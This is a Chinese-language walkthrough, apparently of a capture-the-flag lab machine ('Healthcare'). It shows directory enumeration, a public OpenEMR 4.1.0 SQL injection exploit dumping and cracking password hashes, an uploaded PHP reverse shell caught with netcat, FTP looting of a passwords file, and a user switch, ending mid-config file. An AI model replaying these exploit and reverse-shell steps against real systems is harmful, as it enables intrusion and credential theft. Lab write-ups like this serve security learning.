http://192.1.1.141/cgi-bin/<br><br>[11:15:35] Starting: <br>[11:15:36] 403 -  997B  - /cgi-bin/.ht_wsr.txt                             <br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess.sample<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess.bak1<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess_extra<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess.orig<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccessOLD2<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess_orig<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess.save<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccessBAK<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess_sc<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccessOLD<br>[11:15:36] 403 -  997B  - /cgi-bin/.html                                   <br>[11:15:36] 403 -  997B  - /cgi-bin/.htpasswds<br>[11:15:36] 403 -  997B  - /cgi-bin/.httr-oauth<br>[11:15:36] 403 -  997B  - /cgi-bin/.htpasswd_test<br>[11:15:36] 403 -  997B  - /cgi-bin/.htm<br>[11:16:03] 200 -    1KB - /cgi-bin/test.cgi                                 <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>除了 test.cgi 之外没有别的可访问文件了，加一下 User-agent 再爆破一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dirsearch -u http://192.1.1.141 --user-agent=<span class="hljs-string">&quot;User-agent: htdig&quot;</span><br></code></pre></td></tr></table></figure><p>没别的结果了。而且 index 页面是 <code>index.html</code></p><p>所以这个 User-agent 到底有什么用呢，将 <code>htdig</code> 当字典先存起来吧</p><p>网页很简单，倒计时是 script 触发的</p><p><img src="/pic/a4601039683d8d46198c9814a6036dbe_MD5.png"></p><p>小结一下，目前可以感知到的可能的攻击路径：robots.txt 中的目录（虽然都无法访问），<code>test.cgi</code> 文件，21 ftp 端口</p><p>尝试搜索 <code>test cgi exploit</code> ，有某些 bash 版本存在漏洞，但是尝试利用失败</p><p>尝试对 21 端口进行爆破，使用猜测的用户名 <code>htdig</code>, <code>oden</code> ，爆破失败</p><p>在这里卡了很久，没有思路，最后看 WP，发现是爆破字典的问题……</p><p>这里也是给自己一个提醒了，目录字典的问题一直没有考虑过，无脑使用 <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>。不过为什么 kali 中默认只有 2.3-medium 版本，而没有 big 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.141 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.141<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/08/11 14:00:52 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index                (Status: 200) [Size: 5031]<br>/images               (Status: 301) [Size: 338] [--&gt; http://192.1.1.141/images/]<br>/css                  (Status: 301) [Size: 335] [--&gt; http://192.1.1.141/css/]<br>/js                   (Status: 301) [Size: 334] [--&gt; http://192.1.1.141/js/]<br>/vendor               (Status: 301) [Size: 338] [--&gt; http://192.1.1.141/vendor/]<br>/favicon              (Status: 200) [Size: 1406]<br>/robots               (Status: 200) [Size: 620]<br>/fonts                (Status: 301) [Size: 337] [--&gt; http://192.1.1.141/fonts/]<br>/gitweb               (Status: 301) [Size: 338] [--&gt; http://192.1.1.141/gitweb/]<br>/phpMyAdmin           (Status: 403) [Size: 59]<br>/server-status        (Status: 403) [Size: 997]<br>/server-info          (Status: 403) [Size: 997]<br>/openemr              (Status: 301) [Size: 339] [--&gt; http://192.1.1.141/openemr/]<br>Progress: 1272284 / 1273834 (99.88%)<br>===============================================================<br>2023/08/11 14:06:40 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h2 id="OpenEMR-4-1-0-SQL-注入漏洞"><a href="#OpenEMR-4-1-0-SQL-注入漏洞" class="headerlink" title="OpenEMR 4.1.0 SQL 注入漏洞"></a>OpenEMR 4.1.0 SQL 注入漏洞</h2><p>发现了一个隐藏的目录 <code>/openemr</code>，访问该页面</p><p><img src="/pic/056df356faeed5a19a59a7aa57c0aee3_MD5.png"></p><p>有两个思路，这里看到了版本信息，可以尝试搜索该版本是否存在漏洞，再一个漏洞利用不成功的话可以考虑爆破</p><p>先从简单的查漏洞开始：搜索 <code>OpenEMR 4.1.0</code> </p><p><img src="/pic/b2e17b3a33a0ef4bd6d47d7df84327d1_MD5.png"></p><p>发现存在 exp，那就查看并修改其中的 url，在本地运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ python 49742.py<br><br>   ____                   ________  _______     __ __   ___ ____<br>  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  &lt;  // __ \<br> / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /<br>/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /<br>\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/<br>    /_/<br>    ____  ___           __   _____ ____    __    _<br>   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)<br>  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /<br> / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /<br>/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike<br><br>[+] Finding number of <span class="hljs-built_in">users</span>...<br>[+] Found number of <span class="hljs-built_in">users</span>: 2<br>[+] Extracting username and password <span class="hljs-built_in">hash</span>...<br>admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8<br>medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d<br></code></pre></td></tr></table></figure><p>应该是自动盲注得到了用户名和密码，不过这个密码看起来有点像 hash，尝试在线工具碰撞一下</p><p><img src="/pic/74a7ccd8aee5b709ef1824a14aba5448_MD5.png"></p><p>拿到了两个用户名密码对，<code>admin:ackbar</code>, <code>medical:medical</code></p><p>尝试在网站和 ftp 中分别登录</p><h2 id="后台上传文件-getshell"><a href="#后台上传文件-getshell" class="headerlink" title="后台上传文件 getshell"></a>后台上传文件 getshell</h2><p>网站中 admin 登录成功，ftp 中 medical 登录成功</p><p>网站中寻寻觅觅，找到了文件上传的入口（先在 ftp 中查看了网站目录结构，由于权限问题，ftp 中无法上传文件到网站目录）</p><p><img src="/pic/4e93965164248720640c5b226e75f27a_MD5.png"></p><p>直接上传一个经典 php 马，然后根据路径去访问<code>http://192.1.1.141/openemr/sites/default/images/php-reverse-shell.php</code>，来 getshell</p><p>成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nc -lvnp 443                       <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.141] 60168<br>Linux localhost.localdomain 2.6.38.8-pclos3.bfs <span class="hljs-comment">#1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux</span><br> 15:51:06 up 21:22,  0 <span class="hljs-built_in">users</span>,  load average: 1.00, 1.06, 1.07<br>USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=479(apache) gid=416(apache) <span class="hljs-built_in">groups</span>=416(apache)<br>sh: no job control <span class="hljs-keyword">in</span> this shell<br>sh-4.1$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>apache<br>sh-4.1$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=479(apache) gid=416(apache) <span class="hljs-built_in">groups</span>=416(apache)<br>sh-4.1$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:95:f1:6a brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.141/24 brd 192.1.1.255 scope global eth1<br>    inet6 fe80::20c:29ff:fe95:f16a/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>ip a<br>sh-4.1$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux localhost.localdomain 2.6.38.8-pclos3.bfs <span class="hljs-comment">#1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux</span><br><br>sh-4.1$ <span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>sh-4.1$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>ftp 中寻寻觅觅</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ ftp 192.1.1.141<br>Connected to 192.1.1.141.<br>220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.1.1.141]<br>Name (192.1.1.141:kali): medical<br>331 Password required <span class="hljs-keyword">for</span> medical<br>Password: <br>230 User medical logged <span class="hljs-keyword">in</span><br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Type <span class="hljs-built_in">set</span> to I<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||48953|)<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxr--r--   2 medical  medical      4096 Nov  5  2011 Desktop<br>drwx------   2 medical  medical      4096 Nov  5  2011 Documents<br>drwx------   2 medical  medical      4096 Oct 27  2011 Downloads<br>drwx------   2 medical  medical      4096 Jan 19  2010 Movies<br>drwx------   2 medical  medical      4096 Jan 19  2010 Music<br>drwx------   2 medical  medical      4096 Oct 27  2011 Pictures<br>drwxr-xr-x   2 medical  medical      4096 Jul 20  2011 Templates<br>drwxr-xr-x   2 medical  medical      4096 Jul 20  2011 Videos<br>drwx------   9 medical  medical      4096 Nov  5  2011 tmp<br>226 Transfer complete<br>ftp&gt; <span class="hljs-built_in">cd</span> Desktop<br>250 CWD <span class="hljs-built_in">command</span> successful<br>ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||24046|)<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxr--r--   2 medical  medical      4.0k Nov  5  2011 .<br>drwxr-xr-x  31 medical  medical      4.0k Nov  5  2011 ..<br>-rwxr-xr-x   1 medical  medical       265 Jul  3  2011 Get Libre Office.desktop<br>-rwxr-xr-x   1 medical  medical       229 Apr 12  2010 addlocale.desktop<br>-rwxr-xr-x   1 medical  medical       225 Apr 12  2010 drakfirewall.desktop<br>-rwxr-xr-x   1 medical  medical      1.2k Apr 12  2010 draknetcenter.desktop<br>226 Transfer complete<br>ftp&gt; <span class="hljs-built_in">cd</span> ..<br>250 CWD <span class="hljs-built_in">command</span> successful<br></code></pre></td></tr></table></figure><p>桌面上没东西，那就看看别的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||43237|)<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxr-xr-x  31 medical  medical      4.0k Nov  5  2011 .<br>drwxr-xr-x   5 root     root         4.0k Jul 29  2020 ..<br>-rw-------   1 medical  medical      5.9k Nov  5  2011 .ICEauthority<br>-rw-------   1 medical  medical       120 Nov  5  2011 .Xauthority<br>drwx------   3 medical  medical      4.0k Nov  5  2011 .adobe<br>-rw-r--r--   1 medical  medical       193 Sep 24  2011 .bash_profile<br>-rw-rw-r--   1 medical  medical       145 Sep  6  2011 .bashrc<br>drwxr-xr-x   3 medical  medical      4.0k Nov  5  2011 .cache<br>drwx------  11 medical  medical      4.0k Nov  5  2011 .config<br>drwx------   3 medical  medical      4.0k Oct 27  2011 .dbus<br>-rwxrwxr-x   1 root     root           14 Nov  5  2011 .desktop<br>-rw-------   1 medical  medical        28 Nov  5  2011 .dmrc<br>-rw-------   1 medical  medical        16 Oct 27  2011 .esd_auth<br>drwxr-xr-x   2 medical  medical      4.0k Nov  5  2011 .fontconfig<br>drwx------   4 medical  medical      4.0k Nov  5  2011 .gconf<br>drwx------   2 medical  medical      4.0k Nov  5  2011 .gconfd<br>-rw-r-----   1 medical  medical         0 Nov  5  2011 .gksu.lock<br>drwx------   9 medical  medical      4.0k Nov  5  2011 .gnome2<br>drwx------   2 medical  medical      4.0k Jul 20  2011 .gnome2_private<br>drwx------   3 medical  medical      4.0k Oct 27  2011 .gnupg<br>-rw-rw-r--   1 medical  medical       326 Nov  5  2011 .gtk-bookmarks<br>drwxrwxr-x   2 medical  medical      4.0k Oct 27  2011 .icons<br>drwxr-xr-x   3 medical  medical      4.0k Jul 20  2011 .<span class="hljs-built_in">local</span><br>drwx------   3 medical  medical      4.0k Oct 27  2011 .macromedia<br>-rw-r--r--   1 medical  medical         0 Oct 23  2010 .mdk-menu-migrated<br>-rw-rw-r--   1 medical  medical         0 Nov  5  2011 .menu-updates.stamp<br>drwx------   4 medical  medical      4.0k Oct 27  2011 .mozilla<br>drwx------   3 medical  medical      4.0k Oct 27  2011 .mysqlgui<br>drwxr-xr-x   2 medical  medical      4.0k Oct 23  2010 .nautilus<br>drwx------   3 medical  medical      4.0k Nov  5  2011 .pki<br>drwx------   2 medical  medical      4.0k Oct 27  2011 .pulse<br>-rw-------   1 medical  medical       256 Oct 27  2011 .pulse-cookie<br>drwxrwxr-x   2 medical  medical      4.0k Jul 20  2011 .themes<br>drwx------   3 medical  medical      4.0k Jul 20  2011 .thumbnails<br>-rw-r--r--   1 medical  medical      1.9k Jul  6  2011 .xbindkeysrc<br>drwxr--r--   2 medical  medical      4.0k Nov  5  2011 Desktop<br>drwx------   2 medical  medical      4.0k Nov  5  2011 Documents<br>drwx------   2 medical  medical      4.0k Oct 27  2011 Downloads<br>drwx------   2 medical  medical      4.0k Jan 19  2010 Movies<br>drwx------   2 medical  medical      4.0k Jan 19  2010 Music<br>drwx------   2 medical  medical      4.0k Oct 27  2011 Pictures<br>drwxr-xr-x   2 medical  medical      4.0k Jul 20  2011 Templates<br>drwxr-xr-x   2 medical  medical      4.0k Jul 20  2011 Videos<br>drwx------   9 medical  medical      4.0k Nov  5  2011 tmp<br>226 Transfer complete<br>ftp&gt; <span class="hljs-built_in">cd</span> Documents<br>250 CWD <span class="hljs-built_in">command</span> successful<br>ftp&gt; <span class="hljs-built_in">ls</span> -alih<br>229 Entering Extended Passive Mode (|||35557|)<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwx------   2 medical  medical      4.0k Nov  5  2011 .<br>drwxr-xr-x  31 medical  medical      4.0k Nov  5  2011 ..<br>-rwxr-xr-x   1 medical  medical     33.8k Nov  4  2011 OpenEMR Passwords.pdf<br>-rw-rw-r--   1 medical  medical        82 Oct 27  2011 Passwords.txt<br></code></pre></td></tr></table></figure><p>发现了 <code>Passwords.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ <span class="hljs-built_in">cat</span> Passwords.txt       <br>PCLINUXOS MEDICAL<br>root-root<br>medical-medical<br><br><br>OPENEMR<br>admin-admin<br>medical-medical<br></code></pre></td></tr></table></figure><p>得到了三对密码对，既然已经 getshell 了那就直接尝试上述密码对，还根据 &#x2F;etc&#x2F;passwd 文件来缩小用户范围（也就是排除掉admin）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.1$ su medical<br>su medical<br>Password: medical<br><br>[medical@localhost /]$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>medical<br>[medical@localhost /]$ su -<br>su -<br>Password: root<br><br>su: incorrect password<br>[medical@localhost /]$ su root<br>su root<br>Password: root<br><br>su: incorrect password<br>[medical@localhost /]$ sudo -l<br>sudo -l<br>bash: sudo: <span class="hljs-built_in">command</span> not found<br>[medical@localhost /]$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>medical<br>[medical@localhost /]$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=500(medical) gid=500(medical) <span class="hljs-built_in">groups</span>=500(medical),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(<span class="hljs-built_in">users</span>),490(polkituser),501(fuse)<br>[medical@localhost /]$ <span class="hljs-built_in">ls</span> -liah /etc/passwd<br><span class="hljs-built_in">ls</span> -liah /etc/passwd<br>134072 -rw-r--r-- 1 root root 2.0K Jul 29  2020 /etc/passwd<br>[medical@localhost /]$ <span class="hljs-built_in">ls</span> -liah /etc/shadow<br><span class="hljs-built_in">ls</span> -liah /etc/shadow<br>131337 -r--r----- 1 root shadow 1.1K Jul 29  2020 /etc/shadow<br></code></pre></td></tr></table></figure><p>虽然 root 并不是 root 用户的密码，但是我们还是登录到了 medical 用户</p><p>查看家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost ~]$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 168K<br>267486 drwxr-xr-x 31 medical medical 4.0K Nov  5  2011 ./<br>262657 drwxr-xr-x  5 root    root    4.0K Jul 29  2020 ../<br>267487 -rw-------  1 medical medical 5.9K Nov  5  2011 .ICEauthority<br>267488 -rw-------  1 medical medical  120 Nov  5  2011 .Xauthority<br>267489 drwx------  3 medical medical 4.0K Nov  4  2011 .adobe/<br>267493 -rw-r--r--  1 medical medical  193 Sep 24  2011 .bash_profile<br>267494 -rw-rw-r--  1 medical medical  145 Sep  6  2011 .bashrc<br>267495 drwxr-xr-x  3 medical medical 4.0K Nov  5  2011 .cache/<br>267515 drwx------ 11 medical medical 4.0K Nov  5  2011 .config/<br>414952 drwx------  3 medical medical 4.0K Oct 27  2011 .dbus/<br>267552 -rwxrwxr-x  1 root    root      14 Nov  4  2011 .desktop*<br>267553 -rw-------  1 medical medical   28 Nov  5  2011 .dmrc<br>267554 -rw-------  1 medical medical   16 Oct 27  2011 .esd_auth<br>414955 drwxr-xr-x  2 medical medical 4.0K Nov  4  2011 .fontconfig/<br>414961 drwx------  4 medical medical 4.0K Nov  5  2011 .gconf/<br>415106 drwx------  2 medical medical 4.0K Nov  5  2011 .gconfd/<br>267555 -rw-r-----  1 medical medical    0 Nov  5  2011 .gksu.lock<br>267556 drwx------  9 medical medical 4.0K Nov  4  2011 .gnome2/<br>267574 drwx------  2 medical medical 4.0K Jul 19  2011 .gnome2_private/<br>267575 drwx------  3 medical medical 4.0K Oct 27  2011 .gnupg/<br>267578 -rw-rw-r--  1 medical medical  326 Nov  5  2011 .gtk-bookmarks<br>267579 drwxrwxr-x  2 medical medical 4.0K Oct 27  2011 .icons/<br>267580 drwxr-xr-x  3 medical medical 4.0K Jul 19  2011 .<span class="hljs-built_in">local</span>/<br>415110 drwx------  3 medical medical 4.0K Oct 27  2011 .macromedia/<br>267603 -rw-r--r--  1 medical medical    0 Oct 22  2010 .mdk-menu-migrated<br>267604 -rw-rw-r--  1 medical medical    0 Nov  5  2011 .menu-updates.stamp<br>415118 drwx------  4 medical medical 4.0K Oct 27  2011 .mozilla/<br>415194 drwx------  3 medical medical 4.0K Oct 27  2011 .mysqlgui/<br>415199 drwxr-xr-x  2 medical medical 4.0K Oct 22  2010 .nautilus/<br>415200 drwx------  3 medical medical 4.0K Nov  5  2011 .pki/<br>415205 drwx------  2 medical medical 4.0K Oct 27  2011 .pulse/<br>267605 -rw-------  1 medical medical  256 Oct 27  2011 .pulse-cookie<br>267606 drwxrwxr-x  2 medical medical 4.0K Jul 19  2011 .themes/<br>267607 drwx------  3 medical medical 4.0K Jul 19  2011 .thumbnails/<br>267622 -rw-r--r--  1 medical medical 1.9K Jul  6  2011 .xbindkeysrc<br>267623 drwxr--r--  2 medical medical 4.0K Nov  5  2011 Desktop/<br>267628 drwx------  2 medical medical 4.0K Nov  4  2011 Documents/<br>267631 drwx------  2 medical medical 4.0K Oct 27  2011 Downloads/<br>267633 drwx------  2 medical medical 4.0K Jan 19  2010 Movies/<br>267634 drwx------  2 medical medical 4.0K Jan 19  2010 Music/<br>267635 drwx------  2 medical medical 4.0K Oct 27  2011 Pictures/<br>267637 drwxr-xr-x  2 medical medical 4.0K Jul 19  2011 Templates/<br>267638 drwxr-xr-x  2 medical medical 4.0K Jul 19  2011 Videos/<br>267639 drwx------  9 medical medical 4.0K Nov  5  2011 tmp/<br></code></pre></td></tr></table></figure><p>和 ftp 中看到的一致，在网站目录中找找数据库配置文件，然后用数据库密码尝试碰撞 root 密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>LBF/              edi/          images/                 statement.inc.php<br>clickoptions.txt  era/          letter_templates/<br>config.php        faxcover.txt  referral_template.html<br>documents/        faxtitle.eps  sqlconf.php<br>[medical@localhost default]$ <span class="hljs-built_in">cat</span> sqlconf.php<br><span class="hljs-built_in">cat</span> sqlconf.php<br>&lt;?php<br>//  OpenEMR<br>//  MySQL Config<br><br><span class="hljs-variable">$host</span>   = 